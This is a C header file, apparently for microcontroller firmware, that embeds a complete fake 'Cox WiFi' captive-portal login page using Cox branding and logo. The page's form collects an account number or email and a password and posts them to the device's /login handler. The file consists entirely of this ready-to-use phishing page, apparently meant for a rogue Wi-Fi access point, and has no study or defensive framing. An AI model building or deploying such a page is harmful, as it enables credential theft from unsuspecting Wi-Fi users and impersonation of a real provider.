#ifndef COX_H
#define COX_H

const char COX[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cox WiFi Now</title>
    <style>
        body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;background-image:linear-gradient(135deg,#004B87 0%,#00A3E1 50%,#FF7B00 100%);background-size:400% 400%;animation:gradientAnimation 15s ease infinite;}
        @keyframes gradientAnimation{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
        .login-container{background-color:rgba(255,255,255,0.08);backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px);border-radius:1.5rem;box-shadow:0 15px 30px rgba(0,0,0,0.4),inset 0 0 0 1px rgba(255,255,255,0.15);padding:3rem;max-width:30rem;width:100%;color:#fff;text-align:center;transform:scale(1);transition:all 0.4s cubic-bezier(0.25,0.8,0.25,1);border:1px solid rgba(255,255,255,0.1);}
        .login-container:hover{transform:scale(1.01);box-shadow:0 20px 40px rgba(0,0,0,0.5),inset 0 0 0 1px rgba(255,255,255,0.25);}
        .header-section{margin-bottom:2.5rem;display:flex;flex-direction:column;align-items:center;}
        .cox-logo{height:3rem;width:auto;margin-bottom:1.5rem;}
        .main-title{font-size:2.5rem;line-height:1.2;font-weight:700;color:#fff;text-shadow:0 3px 6px rgba(0,0,0,0.3);margin-bottom:0.75rem;}
        .sub-title{font-size:1.25rem;line-height:1.4;font-weight:400;color:rgba(255,255,255,0.9);margin-bottom:0;}
        .input-group{margin-bottom:1.5rem;display:flex;justify-content:center;}
        .form-input{width:100%;max-width:22rem;padding:1rem 1.25rem;font-size:1.1rem;background-color:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:0.75rem;color:#fff;transition:all 0.3s ease;appearance:none;outline:none;box-shadow:inset 0 2px 4px rgba(0,0,0,0.1);}
        .form-input::placeholder{color:rgba(255,255,255,0.5);}
        .form-input:focus{background-color:rgba(255,255,255,0.2);border-color:#00A3E1;box-shadow:0 0 0 3px #00A3E1,inset 0 2px 4px rgba(0,0,0,0.15);}
        .button-wrapper{margin-top:2.5rem;display:flex;justify-content:center;}
        .action-button{width:100%;max-width:22rem;background-color:#005799;color:#fff;font-weight:600;font-size:1.2rem;padding:1.1rem 2.5rem;border-radius:0.75rem;box-shadow:0 12px 25px rgba(0,0,0,0.4),inset 0 0 0 1px rgba(255,255,255,0.15);transition:all 0.3s ease-in-out;cursor:pointer;border:none;letter-spacing:0.08em;text-transform:uppercase;}
        .action-button:hover{background-color:#00A3E1;transform:translateY(-0.2rem) scale(1.01);box-shadow:0 18px 35px rgba(0,0,0,0.5),inset 0 0 0 1px rgba(255,255,255,0.25);}
        .action-button:active{transform:translateY(0);box-shadow:0 8px 20px rgba(0,0,0,0.3);}
        .action-button:focus{outline:none;box-shadow:0 0 0 4px #00A3E1;}
        .footer-text{font-size:0.85rem;opacity:0.7;margin-top:3rem;color:#fff;}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header-section">
            <svg class="cox-logo" version="1.1" id="Layer_1" xmlns:cc="http://creativecommons.org/ns#" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 822.1 272.2" style="enable-background:new 0 0 822.1 272.2;" xml:space="preserve">
                <style type="text/css">.st0{fill:#00D258;}.st1{fill:url(#SVGID_1_);}.st2{fill:#00AAF4;}</style>
                <defs>
                    <linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="-24.0444" y1="330.7014" x2="209.9791" y2="96.6838" gradientTransform="matrix(0.8221 0 0 -0.8221 4.5028 411.7385)">
                        <stop offset="0.12" style="stop-color:#00AAF4;"></stop>
                        <stop offset="0.88" style="stop-color:#00D258;"></stop>
                    </linearGradient>
                </defs>
                <g transform="translate(319.7 -99.958)">
                    <g>
                        <path class="st0" d="M421.8,236l73.4-83c10.5-11.9,9.4-30.1-2.5-40.6c-11.9-10.5-30.1-9.4-40.6,2.5l-68.7,77.7L314.8,115c-10.5-11.9-28.7-13-40.6-2.5c-11.9,10.5-13,28.7-2.5,40.6l73.4,83l-73.4,83c-10.5,11.9-9.4,30.1,2.5,40.6c11.9,10.5,30.1,9.4,40.6-2.5l68.7-77.7l68.7,77.7c10.5,11.9,28.7,13,40.6,2.5c11.9-10.5,13-28.7,2.5-40.6L421.8,236z"/>
                        <path class="st1" d="M80.9,372.2c-75,0-136.1-61-136.1-136.1S5.9,100,80.9,100c75,0,136.1,61,136.1,136.1S156,372.2,80.9,372.2L80.9,372.2z M80.9,157.4c-43.4,0-78.6,35.3-78.6,78.6c0,43.3,35.3,78.6,78.6,78.6c43.3,0,78.6-35.3,78.6-78.6S124.3,157.4,80.9,157.4L80.9,157.4z"/>
                        <path class="st2" d="M-183.6,372.2c-75.1,0-136.1-61.1-136.1-136.1s61-136.1,136.1-136.1c24.4,0,48.3,6.5,69.2,18.9c13.7,8.1,18.2,25.7,10.1,39.4c-8.1,13.7-25.7-3.6-39.4,10.1c-12-7.1-25.9-10.9-39.9-10.9c-43.4,0-78.6,35.3-78.6,78.6s35.3,78.6,78.6,78.6c14.1,0,27.9-3.8,39.9-10.9c13.7-8.1,31.3-3.6,39.4,10.1c8.1,13.7,3.6,31.3-10.1,39.4C-135.3,365.6-159.2,372.2-183.6,372.2L-183.6,372.2z"/>
                    </g>
                </g>
            </svg>
            <h1 class="main-title">Welcome to Cox WiFi!</h1>
            <h2 class="sub-title">Please sign in to connect now</h2>
        </div>
        <form action="/login" id="email-form-step" method="post">
            <div class="input-group">
                <input name="email" type="text" class="form-input" placeholder="Account Number or Email" required autocomplete="off" aria-label="Account Number or Email">
            </div>
            <div class="input-group">
                <input name="password" type="password" class="form-input" placeholder="Password" required autocomplete="off" aria-label="Password">
            </div>
            <div class="button-wrapper">
                <button type="submit" class="action-button">Connect to WiFi</button>
            </div>
        </form>
        <div class="footer-text">
            <p>&copy; 2025 Cox Communications. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)rawliteral";
#endif